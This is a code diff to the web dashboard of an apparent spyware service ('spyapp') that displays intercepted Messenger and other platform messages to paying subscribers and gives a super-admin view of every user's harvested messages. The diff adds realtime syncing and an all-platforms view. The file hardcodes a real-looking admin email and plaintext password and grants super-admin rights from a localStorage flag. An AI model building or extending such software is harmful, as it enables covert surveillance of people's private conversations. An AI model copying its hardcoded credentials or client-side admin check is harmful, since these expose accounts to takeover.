@@ -1,6 +1,9 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
 import {
   getAuth,
+  browserLocalPersistence,
+  onAuthStateChanged,
+  setPersistence,
   signInWithEmailAndPassword,
   signOut
 } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-auth.js";
@@ -8,6 +11,7 @@ import {
   getDatabase,
   ref,
   get,
+  onValue,
   push,
   set,
   update,
@@ -27,6 +31,7 @@ const firebaseConfig = {
 
 const SUPER_ADMIN_EMAIL = "asifrezan.office@gmail.com";
 const SUPER_ADMIN_PASSWORD = "admin0011";
+const SUPER_ADMIN_SESSION_KEY = "spyapp.superAdminSession";
 const FREE_MESSAGE_LIMIT = 10;
 const MONTH_MS = 30 * 24 * 60 * 60 * 1000;
 
@@ -54,8 +59,8 @@ const db = getDatabase(app);
 
 let currentUser = null;
 let isSuperAdmin = false;
-let selectedPlatform = "Messenger";
-let selectedAdminPlatform = "Messenger";
+let selectedPlatform = "All";
+let selectedAdminPlatform = "All";
 let messagesByPlatform = {};
 let currentUserProfile = null;
 let usersById = {};
@@ -65,6 +70,8 @@ let currentUserPayments = {};
 let pendingPaymentPayload = null;
 let siteSettings = {};
 let pendingConfirmAction = null;
+let authStarted = false;
+let realtimeUnsubscribers = [];
 
 const authView = document.querySelector("#authView");
 const dashboardView = document.querySelector("#dashboardView");
@@ -107,6 +114,9 @@ const deleteSelectedUserMessages = document.querySelector("#deleteSelectedUserMe
 const deleteAllMessages = document.querySelector("#deleteAllMessages");
 const settingsForm = document.querySelector("#settingsForm");
 const downloadLinkInput = document.querySelector("#downloadLinkInput");
+const tutorialVideoInput = document.querySelector("#tutorialVideoInput");
+const tutorialVideoSection = document.querySelector("#tutorialVideoSection");
+const tutorialVideoFrame = document.querySelector("#tutorialVideoFrame");
 const settingsMessage = document.querySelector("#settingsMessage");
 const confirmModal = document.querySelector("#confirmModal");
 const confirmText = document.querySelector("#confirmText");
@@ -114,6 +124,7 @@ const confirmCancel = document.querySelector("#confirmCancel");
 const confirmSubmit = document.querySelector("#confirmSubmit");
 
 loadPublicSettings();
+startAuthSession();
 
 downloadAppButton.addEventListener("click", async () => {
   downloadMessage.textContent = "";
@@ -138,6 +149,7 @@ loginForm.addEventListener("submit", async (event) => {
     if (email === SUPER_ADMIN_EMAIL && password === SUPER_ADMIN_PASSWORD) {
       isSuperAdmin = true;
       currentUser = { uid: "super-admin", email };
+      localStorage.setItem(SUPER_ADMIN_SESSION_KEY, "true");
       await showSuperAdminDashboard();
       return;
     }
@@ -156,6 +168,8 @@ logoutButton.addEventListener("click", async () => {
     if (!isSuperAdmin) {
       await signOut(auth);
     }
+    localStorage.removeItem(SUPER_ADMIN_SESSION_KEY);
+    cleanupRealtimeListeners();
     currentUser = null;
     isSuperAdmin = false;
     authView.classList.remove("hidden");
@@ -224,9 +238,12 @@ settingsForm.addEventListener("submit", async (event) => {
   const button = settingsForm.querySelector("button[type='submit']");
   await withButtonState(button, "Saving...", "Saved", async () => {
     const appDownloadUrl = downloadLinkInput.value.trim();
-    await update(ref(db, "SiteSettings"), { appDownloadUrl });
+    const tutorialVideoUrl = tutorialVideoInput.value.trim();
+    await update(ref(db, "SiteSettings"), { appDownloadUrl, tutorialVideoUrl });
     siteSettings.appDownloadUrl = appDownloadUrl;
-    settingsMessage.textContent = appDownloadUrl ? "Download link saved." : "Download link removed. Users will see unavailable message.";
+    siteSettings.tutorialVideoUrl = tutorialVideoUrl;
+    renderTutorialVideo();
+    settingsMessage.textContent = "Settings saved.";
   });
 });
 
@@ -292,7 +309,48 @@ confirmSubmit.addEventListener("click", async () => {
   });
 });
 
+async function startAuthSession() {
+  if (authStarted) return;
+  authStarted = true;
+
+  await setPersistence(auth, browserLocalPersistence);
+
+  if (localStorage.getItem(SUPER_ADMIN_SESSION_KEY) === "true") {
+    isSuperAdmin = true;
+    currentUser = { uid: "super-admin", email: SUPER_ADMIN_EMAIL };
+    await showSuperAdminDashboard();
+    return;
+  }
+
+  onAuthStateChanged(auth, async (user) => {
+    if (isSuperAdmin) return;
+    if (!user) {
+      cleanupRealtimeListeners();
+      currentUser = null;
+      currentUserProfile = null;
+      authView.classList.remove("hidden");
+      dashboardView.classList.add("hidden");
+      return;
+    }
+
+    currentUser = user;
+    isSuperAdmin = false;
+    await showUserDashboard();
+  });
+}
+
+function cleanupRealtimeListeners() {
+  realtimeUnsubscribers.forEach((unsubscribe) => unsubscribe());
+  realtimeUnsubscribers = [];
+}
+
+function watch(path, handler) {
+  const unsubscribe = onValue(ref(db, path), (snapshot) => handler(snapshot.val() || {}));
+  realtimeUnsubscribers.push(unsubscribe);
+}
+
 async function showUserDashboard() {
+  cleanupRealtimeListeners();
   roleLabel.textContent = "User Dashboard";
   dashboardTitle.textContent = currentUser.email || "Messages";
   userNav.classList.remove("hidden");
@@ -301,19 +359,27 @@ async function showUserDashboard() {
   dashboardView.classList.remove("hidden");
   showUserTab("messages");
 
-  const profileSnap = await get(ref(db, `Users/${currentUser.uid}`));
-  currentUserProfile = profileSnap.val() || {};
+  watch(`Users/${currentUser.uid}`, (profile) => {
+    currentUserProfile = profile;
+    renderUserSummary();
+    renderPaymentStatus();
+    renderMessages();
+  });
 
-  const messagesSnap = await get(ref(db, `Messages/${currentUser.uid}`));
-  messagesByPlatform = messagesSnap.val() || {};
-  const paymentsSnap = await get(ref(db, "PaymentRequests"));
-  currentUserPayments = filterPaymentsForUser(paymentsSnap.val() || {}, currentUser.uid);
-  renderUserSummary();
-  renderPaymentStatus();
-  renderMessages();
+  watch(`Messages/${currentUser.uid}`, (messages) => {
+    messagesByPlatform = messages;
+    renderUserSummary();
+    renderMessages();
+  });
+
+  watch("PaymentRequests", (payments) => {
+    currentUserPayments = filterPaymentsForUser(payments, currentUser.uid);
+    renderPaymentStatus();
+  });
 }
 
 async function showSuperAdminDashboard() {
+  cleanupRealtimeListeners();
   roleLabel.textContent = "Super Admin";
   dashboardTitle.textContent = "Subscription Control";
   userNav.classList.add("hidden");
@@ -373,26 +439,27 @@ function renderAdminSummary() {
 }
 
 function renderMessages() {
-  const rawMessages = messagesByPlatform[selectedPlatform] || {};
-  const messages = normalizeMessages(rawMessages);
-  const subscribed = hasPlatformAccess(selectedPlatform);
-  const visibleMessages = subscribed ? messages : messages.slice(0, FREE_MESSAGE_LIMIT);
-  const lockedMessages = subscribed ? [] : messages.slice(FREE_MESSAGE_LIMIT);
+  const messages = normalizePlatformMessages(messagesByPlatform, selectedPlatform);
+  const renderedMessages = getRenderedUserMessages(messages);
+  const lockedMessages = renderedMessages.filter((message) => message.locked);
+  const subscribed = selectedPlatform === "All" ? messages.some((message) => hasPlatformAccess(message.platform)) : hasPlatformAccess(selectedPlatform);
 
   subscriptionBadge.textContent = subscribed ? "Subscribed" : "Free";
   messageCounter.textContent = `${messages.length} messages`;
-  accessHint.textContent = subscribed ? "Full access enabled" : `Free preview: ${Math.min(FREE_MESSAGE_LIMIT, messages.length)} of ${messages.length}`;
+  accessHint.textContent = getAccessHint(messages, renderedMessages);
   renderSubscriptionProgress();
   messageList.innerHTML = "";
 
   if (messages.length === 0) {
-    messageList.innerHTML = `<p class="muted">No ${selectedPlatform} messages found.</p>`;
+    messageList.innerHTML = `<p class="muted">No ${selectedPlatform === "All" ? "" : selectedPlatform + " "}messages found for this account.</p>`;
     return;
   }
 
-  [...visibleMessages.map((message) => ({ ...message, locked: false })),
-    ...lockedMessages.map((message) => ({ ...message, locked: true }))]
-    .forEach((message) => messageList.appendChild(createMessageCard(message, message.locked)));
+  renderedMessages.forEach((message) => messageList.appendChild(createMessageCard(message, message.locked, selectedPlatform === "All")));
+
+  if (lockedMessages.length > 0) {
+    messageList.appendChild(createFreePreviewWarning(lockedMessages.length));
+  }
 }
 
 function renderPaymentStatus() {
@@ -446,22 +513,33 @@ function hasPlatformAccess(platform) {
 }
 
 async function loadAdminData() {
-  const [usersSnap, paymentsSnap, messagesSnap, settingsSnap] = await Promise.all([
-    get(ref(db, "Users")),
-    get(ref(db, "PaymentRequests")),
-    get(ref(db, "Messages")),
-    get(ref(db, "SiteSettings"))
-  ]);
+  cleanupRealtimeListeners();
 
-  usersById = usersSnap.val() || {};
-  paymentsById = paymentsSnap.val() || {};
-  allMessagesByUser = messagesSnap.val() || {};
-  siteSettings = settingsSnap.val() || {};
-  renderAdminSummary();
-  renderUsers();
-  renderPayments();
-  renderAdminUserSelect();
-  renderAdminMessages();
+  watch("Users", (users) => {
+    usersById = users;
+    renderAdminSummary();
+    renderUsers();
+    renderAdminUserSelect();
+    renderAdminMessages();
+  });
+
+  watch("PaymentRequests", (payments) => {
+    paymentsById = payments;
+    renderAdminSummary();
+    renderPayments();
+  });
+
+  watch("Messages", (messages) => {
+    allMessagesByUser = messages;
+    renderAdminSummary();
+    renderAdminUserSelect();
+    renderAdminMessages();
+  });
+
+  watch("SiteSettings", (settings) => {
+    siteSettings = settings;
+    renderSettings();
+  });
 }
 
 function renderUsers() {
@@ -536,10 +614,33 @@ function renderPayments() {
 }
 
 function renderAdminUserSelect() {
-  const users = Object.entries(usersById);
+  const currentSelection = adminUserSelect.value;
+  const users = Object.entries(usersById)
+    .map(([uid, user]) => ({
+      uid,
+      user,
+      messageCount: countMessages(allMessagesByUser[uid] || {})
+    }))
+    .sort((a, b) => b.messageCount - a.messageCount || getUserLabel(a.uid, a.user).localeCompare(getUserLabel(b.uid, b.user)));
+
   adminUserSelect.innerHTML = users
-    .map(([uid, user]) => `<option value="${uid}">${escapeHtml(user.username || user.email || uid)}</option>`)
+    .map(({ uid, user, messageCount }) => {
+      const label = getUserLabel(uid, user);
+      const suffix = messageCount ? ` (${messageCount} messages)` : " (no messages)";
+      return `<option value="${uid}">${escapeHtml(label + suffix)}</option>`;
+    })
     .join("");
+
+  const topUserWithMessages = users.find(({ messageCount }) => messageCount > 0);
+  const selectedUser = users.find(({ uid }) => uid === currentSelection);
+
+  if (selectedUser && (selectedUser.messageCount > 0 || !topUserWithMessages)) {
+    adminUserSelect.value = currentSelection;
+  } else if (topUserWithMessages) {
+    adminUserSelect.value = topUserWithMessages.uid;
+  } else if (users.length > 0) {
+    adminUserSelect.value = users[0].uid;
+  }
 }
 
 function renderAdminMessages() {
@@ -551,22 +652,27 @@ function renderAdminMessages() {
   }
 
   const user = usersById[uid] || {};
-  const rawMessages = allMessagesByUser[uid]?.[selectedAdminPlatform] || {};
-  const messages = normalizeMessages(rawMessages);
+  const messages = normalizePlatformMessages(allMessagesByUser[uid] || {}, selectedAdminPlatform);
   adminMessageUser.textContent = user.username || user.email || uid;
   adminMessageCounter.textContent = `${messages.length} messages`;
   adminMessageList.innerHTML = "";
 
   if (messages.length === 0) {
-    adminMessageList.innerHTML = `<p class="muted">No ${selectedAdminPlatform} messages found for this user.</p>`;
+    adminMessageList.innerHTML = `<p class="muted">No ${selectedAdminPlatform === "All" ? "" : selectedAdminPlatform + " "}messages found for this user.</p>`;
     return;
   }
 
-  messages.forEach((message) => adminMessageList.appendChild(createMessageCard(message, false)));
+  messages.forEach((message) => adminMessageList.appendChild(createMessageCard(message, false, selectedAdminPlatform === "All")));
+}
+
+function getUserLabel(uid, user = {}) {
+  return user.username || user.email || uid;
 }
 
 function renderSettings() {
   downloadLinkInput.value = siteSettings.appDownloadUrl || "";
+  tutorialVideoInput.value = siteSettings.tutorialVideoUrl || "";
+  renderTutorialVideo();
 }
 
 async function approveSubscription(uid, planKey, paymentId = null) {
@@ -637,8 +743,10 @@ async function loadPublicSettings() {
   try {
     const settingsSnap = await get(ref(db, "SiteSettings"));
     siteSettings = settingsSnap.val() || {};
+    renderTutorialVideo();
   } catch (error) {
     siteSettings = {};
+    renderTutorialVideo();
   }
 }
 
@@ -656,18 +764,71 @@ function filterPaymentsForUser(payments, uid) {
   );
 }
 
-function createMessageCard(message, locked) {
+function createMessageCard(message, locked, showPlatform = false) {
   const item = document.createElement("article");
   item.className = locked ? "message locked" : "message";
+  const body = escapeHtml(message.message || "").replaceAll("\n", "<br>");
+  const platformLabel = showPlatform && message.platform ? `<span class="message-platform">${escapeHtml(message.platform)}</span>` : "";
   item.innerHTML = `
     <div class="message-meta">
-      <strong>${escapeHtml(message.contactName || "Unknown")}</strong>
+      <strong>${escapeHtml(message.contactName || "Unknown")}${platformLabel}</strong>
       <span>${formatDate(message.timestamp)}</span>
     </div>
-    <p class="message-body">${escapeHtml(message.message || "")}</p>
+    <div class="message-body">${body}</div>
     ${locked ? "<p class='lock-note'>Subscribe to unlock this conversation.</p>" : ""}
   `;
   return item;
+}
+
+function createFreePreviewWarning(hiddenCount) {
+  const item = document.createElement("article");
+  item.className = "preview-warning";
+  item.innerHTML = `
+    <strong>Free preview ended</strong>
+    <p>You have ${hiddenCount} more ${hiddenCount === 1 ? "message" : "messages"} in this app. Subscribe to unlock the full message history.</p>
+  `;
+  return item;
+}
+
+function renderTutorialVideo() {
+  if (!tutorialVideoSection || !tutorialVideoFrame) return;
+
+  const embedUrl = getYoutubeEmbedUrl(siteSettings.tutorialVideoUrl || "");
+  tutorialVideoSection.classList.toggle("hidden", !embedUrl);
+  tutorialVideoFrame.innerHTML = embedUrl
+    ? `<iframe src="${escapeHtml(embedUrl)}" title="Tutorial video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>`
+    : "";
+}
+
+function getYoutubeEmbedUrl(value) {
+  const trimmed = value.trim();
+  if (!trimmed) return "";
+
+  try {
+    const url = new URL(trimmed);
+    const host = url.hostname.replace(/^www\./, "");
+    let videoId = "";
+
+    if (host === "youtube.com" || host === "m.youtube.com") {
+      if (url.pathname.startsWith("/embed/")) {
+        videoId = url.pathname.split("/").filter(Boolean)[1] || "";
+      } else {
+        videoId = url.searchParams.get("v") || "";
+      }
+    }
+
+    if (host === "youtu.be") {
+      videoId = url.pathname.split("/").filter(Boolean)[0] || "";
+    }
+
+    if (!videoId) return "";
+    const embedUrl = new URL(`https://www.youtube.com/embed/${videoId}`);
+    const start = url.searchParams.get("start") || url.searchParams.get("t");
+    if (start) embedUrl.searchParams.set("start", start.replace(/\D/g, ""));
+    return embedUrl.toString();
+  } catch (error) {
+    return "";
+  }
 }
 
 function getSubscriptionInfo(user) {
@@ -714,6 +875,45 @@ function normalizeMessages(rawMessages) {
   return Object.entries(rawMessages)
     .map(([id, message]) => ({ id, ...message }))
     .sort((a, b) => Number(b.timestamp || 0) - Number(a.timestamp || 0));
+}
+
+function normalizePlatformMessages(platformMap, platform) {
+  if (platform !== "All") {
+    return normalizeMessages(platformMap?.[platform] || {});
+  }
+
+  return Object.entries(platformMap || {})
+    .flatMap(([platformName, rawMessages]) =>
+      Object.entries(rawMessages || {}).map(([id, message]) => ({
+        id: `${platformName}-${id}`,
+        platform: message.platform || platformName,
+        ...message
+      }))
+    )
+    .sort((a, b) => Number(b.timestamp || 0) - Number(a.timestamp || 0));
+}
+
+function getRenderedUserMessages(messages) {
+  const subscription = getSubscriptionInfo(currentUserProfile);
+  if (subscription.active) {
+    return messages.map((message) => ({
+      ...message,
+      locked: !hasPlatformAccess(message.platform)
+    }));
+  }
+
+  return messages.map((message, index) => ({
+    ...message,
+    locked: index >= FREE_MESSAGE_LIMIT
+  }));
+}
+
+function getAccessHint(messages, renderedMessages) {
+  if (messages.length === 0) return "";
+  if (renderedMessages.length >= messages.length && renderedMessages.every((message) => !message.locked)) {
+    return "Full access enabled";
+  }
+  return `Preview: ${renderedMessages.filter((message) => !message.locked).length} of ${messages.length}`;
 }
 
 function countMessages(platformMap) {
